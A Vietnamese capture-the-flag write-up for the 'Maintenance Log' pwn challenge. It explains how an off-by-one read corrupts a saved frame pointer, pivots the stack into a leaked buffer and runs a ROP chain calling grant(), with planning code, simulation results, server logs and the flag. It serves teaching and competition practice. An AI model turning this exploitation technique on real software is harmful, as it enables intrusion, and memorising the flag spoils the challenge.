# Maintenance Log - Pwn (150 điểm)

**Cờ:** `CSSCTF{Duh_m4t3_1_4m_sl33py}`
**File đính kèm:** `chall` (Kích thước: 14.480 B, SHA256: `de630ba8...b118e3`), `Dockerfile`, `flag.txt`
**Dịch vụ mạng:** `nc 34.116.80.78 7312`

## Đề bài

Dịch vụ mô phỏng giao diện bảo trì, nhận `summary` và `tag`, đồng thời in địa chỉ của report buffer. Mục tiêu là gọi `grant()` với đúng tham số để đọc `flag.txt`.

## Phân tích ban đầu

`chall` là ELF x86-64, no-PIE (`Type: EXEC`), có NX và partial RELRO, đã stripped. Địa chỉ code cố định nên không cần leak PIE base. Các địa chỉ sau được lấy từ disassembly; `0x40124d` và `0x40124f` là gadget, không phải điểm đầu của một hàm:

| Địa chỉ | Vai trò kỹ thuật | Trạng thái Canary |
| --- | --- | --- |
| `0x4011b6` | Hàm cấu hình `io_setup()`: Thực thi lệnh `setvbuf(stdin/stdout/stderr, _IONBF)` | Có bảo vệ |
| `0x401268` | Hàm điều phối phân quyền `grant(int, int)` - **Mã lệnh chết (dead code)**, không có cơ chế nào trong luồng chính thực hiện lệnh gọi. | Có bảo vệ |
| `0x40124d` | Gadget `pop rdi; ret` (Ẩn trong vùng đệm khối hàm) | Không áp dụng |
| `0x40124f` | Gadget `pop rsi; ret` | Không áp dụng |
| `0x401348` | Hàm thực thi bộ điều hướng `operator()` | Không bảo vệ |
| `0x40139a` | Hàm xuất báo cáo `report()` | Không bảo vệ |

`grant(edi, esi)` kiểm tra `edi == 0xdeadbeef` và `esi == 0xcafebabe`. Khi đúng, hàm đọc `flag.txt` bằng `fopen`, `fgets`, `puts`, rồi gọi `exit(0)`. Khi sai, hàm in `[-] Authentication token mismatch.`.

Disassembly cho thấy canary ở `io_setup`, `grant` và `main`, nhưng không có ở `report()` và `operator()`. Canary của `main` không ngăn được chuỗi gọi `grant()` vì `grant()` gọi `exit(0)` trước khi `main` trở về. `report()` còn in địa chỉ buffer:

```assembly
0x4013b8: lea rax,[rbp-0x50]; mov rsi,rax
0x4013bf: lea rax,[rip+0xcd2]   # Kết xuất: "[*] Report buffer allocated at: %p"
```
`Report buffer` là stack leak dùng trong lời giải. `report()` gọi `read(0, rbp-0x50, 0x50)`, không đọc quá buffer. Sau đó, `operator()` thực hiện:

```assembly
0x401350: memset(rbp-0x20, 0, 0x20)
0x40137a: mov QWORD PTR [rbp-0x28], 0x21
0x401392: read(0, rbp-0x20, 0x21)     # Thực thi đọc 33 byte đối với vùng đệm thiết kế 32 byte
```
Lệnh đọc cuối cho phép ghi 33 byte vào buffer 32 byte. Byte thứ 33 ghi đè byte thấp của saved RBP.

## Chuỗi khai thác

**Bước 1 - Lập bản đồ bộ nhớ ngăn xếp (Stack layout).** 
Đặt biến số `X = rbp_main`, ánh xạ theo đúng trình tự khối khởi tạo (prologue) và khối dọn dẹp (epilogue):

```text
Từ X-0xA0 đến X-0x81 : Khối đệm 32 byte thuộc hàm operator() (Cho phép tùy chỉnh nội dung)
Mốc X-0x80           : Vị trí lưu saved rbp của hàm operator(), giữ giá trị X-0x20 <- Nơi chứa LSB bị lỗ hổng Off-by-one can thiệp
Mốc X-0x78           : Địa chỉ trả về (Return address) của hàm report() (0x401407), nằm ngoài tầm thao túng
Từ X-0x70 đến X-0x21 : Khối đệm 80 byte thuộc hàm report() (Cho phép tùy chỉnh nội dung chứa ROP chain, định danh P = X-0x70)
Mốc X-0x20           : Vị trí lưu saved rbp của hàm report(), giữ giá trị X
Mốc X-0x18           : Địa chỉ trả về (Return address) chuyển hướng vào hàm main (0x401453)
```
Khi `operator()` trả về, saved RBP của `report()` đã bị sửa thành `(X-0x20) & ~0xFF | z`. `z` là byte thứ 33 do payload điều khiển. Khi `report()` chạy `leave; ret`, stack chuyển tới:

```text
Chỉ thị leave      -> Hệ thống thiết lập thanh ghi rsp = B + z (Với B = (X-0x20) & ~0xFF, giữ tính ổn định của 8 byte cao)
Chỉ thị pop rbp    -> Trạng thái cập nhật: rsp = B + z + 8
Chỉ thị ret        -> Thiết lập điểm thực thi: rip = qword[B + z + 8]
```
Payload điều khiển `z`, nên có thể chọn vị trí trong cửa sổ 256 byte quanh `X-0x20`. Từ địa chỉ leak `P`, tính `X = P + 0x70` và `B`, rồi chọn điểm để `ret` đọc ROP chain trong report buffer 80 byte.

**Bước 3 - Cấu hình ràng buộc gọi vùng đệm.** 
Một chuỗi (chain) ROP thực thi phân quyền thành công cần quy tụ 5 vùng giá trị (tổng dung lượng 40 byte):

```text
Mốc +0   Lệnh pop rdi; ret (0x40124d)     Mốc +8   Khởi tạo tham số 0xdeadbeef
Mốc +16  Lệnh pop rsi; ret (0x40124f)     Mốc +24  Khởi tạo tham số 0xcafebabe
Mốc +32  Thực thi grant()  (0x401268)
```
Đặt ROP chain ở offset `O` trong buffer. Từ `A = P + O = B + z + 8`, suy ra `z = O + L - 88`, với `L = (X-0x20) & 0xFF`. Chọn tham số theo các điều kiện:
1. `0 <= z <= 255`, tương đương `O >= 88 - L`.
2. `O <= 40` để chain 40 byte nằm trong buffer 80 byte.
3. `O` là bội số của 16 để giữ stack alignment của chain, với `rsp % 16 == 8` khi vào hàm.
Với `L ∈ {0, 16, 32, 48}`, không có `O` phù hợp. Khi gặp các giá trị này, mở kết nối mới. Có 12 trong 16 giá trị low byte đã kiểm tra cho phép lập chain; tỉ lệ 3/4 là ước lượng theo các layout này, không phải bảo đảm cho từng lần chạy.

```python
def plan(leak_p):
    x = leak_p + 0x70
    b = (x - 0x20) & ~0xFF
    for off in (0, 16, 32):
        z = leak_p + off - 8 - b
        if 0 <= z <= 0xFF:
            return off, z          # Output tham số `z` biểu thị định danh byte lỗi thứ 33 gửi tới hàm operator()
    return None
```
`analysis/selftest.py` dùng fake socket và bộ nhớ mô phỏng để kiểm tra `push rbp`, `leave`, `pop rbp`, `ret` theo disassembly. Nó dùng các hàm `plan`, `payload`, `attempt` của `exploit.py` và thử 16 giá trị `X mod 256`:

```text
[*] Thống kê mô phỏng: thành công=12, plan_bỏ_qua=4, thất_bại=0
[*] Chạy đối chứng (Không tích hợp ROP): result='rip=0x4141414141414141' flag=None
[*] Chạy đối chứng (Giá trị z sai số 1 byte): result='rip=0xef00000000004012'
[+] Quy trình selftest vượt rào thành công (OK)
```
12 layout lập được chain; 4 layout có `L < 56` bị từ chối. Các ca không có ROP hoặc lệch 1 byte đều fail. Selftest cũng phát hiện lỗi ở mô hình ban đầu: return address phải đọc từ `qword[rbp+8]`, không phải `qword[rbp]`. Sau khi sửa, 12/16 layout mô phỏng thành công.

Mỗi lần thử mở một kết nối, đọc leak, gửi report 80 byte chứa ROP chain, rồi gửi tag 33 byte để sửa saved RBP và đọc phản hồi.

```text
[*] Vòng quét 1/8 -> Máy chủ: 34.116.80.78 Cổng: 7312
[*] Giá trị P = 0x7ffdd96ba300 (P%16=0) -> Tham số offset=16 z=0x8 Phân bổ rip<-[0x7ffdd96ba310]
[*] Dữ liệu phản hồi:
[*] Processing report...
[+] Access Granted! Here is your flag:
CSSCTF{Duh_m4t3_1_4m_sl33py}
[+] Trích xuất cờ thành công: CSSCTF{Duh_m4t3_1_4m_sl33py}
```

Kiểm tra chu trình với kết nối lần 2 nhằm xác nhận độ tin cậy của thuật toán `plan` (kiểm tra tính chất tự động thích ứng với cấu trúc địa chỉ bộ nhớ).

```text
[*] Vòng quét 1/8 -> Máy chủ: 34.116.80.78 Cổng: 7312
[*] Giá trị P = 0x7ffda1427b30 (P%16=0) -> Tham số offset=0 z=0x28 Phân bổ rip<-[0x7ffda1427b30]
[+] Trích xuất cờ thành công: CSSCTF{Duh_m4t3_1_4m_sl33py}
```
Lần đầu dùng `offset=16`, lần sau dùng `offset=0`; `plan()` tính offset theo leak của từng kết nối. Flag trả về khác flag thử nghiệm `CSSCTF{definetely_not_flag}` trong file đính kèm.

## Flag

Kết quả:
```text
CSSCTF{Duh_m4t3_1_4m_sl33py}
```

## Reproduce

Chạy script để reproduce:

```bash
python exploit.py                    # Tiến hành thực thi tấn công máy chủ (IP tĩnh, tự điều chỉnh thông số offset)
python exploit.py <host> <port> 8    # Thực thi theo tham số mở: cấu hình host/port/số_chu_kỳ kết nối tối đa
python exploit.py --probe            # Chế độ gửi tải trọng thử nghiệm, kiểm định cơ cấu đường ống mạng (flow)
python analysis/selftest.py          # Triển khai bộ giả lập ngoại tuyến, kiểm thử kết xuất hệ tọa độ frame stack
```
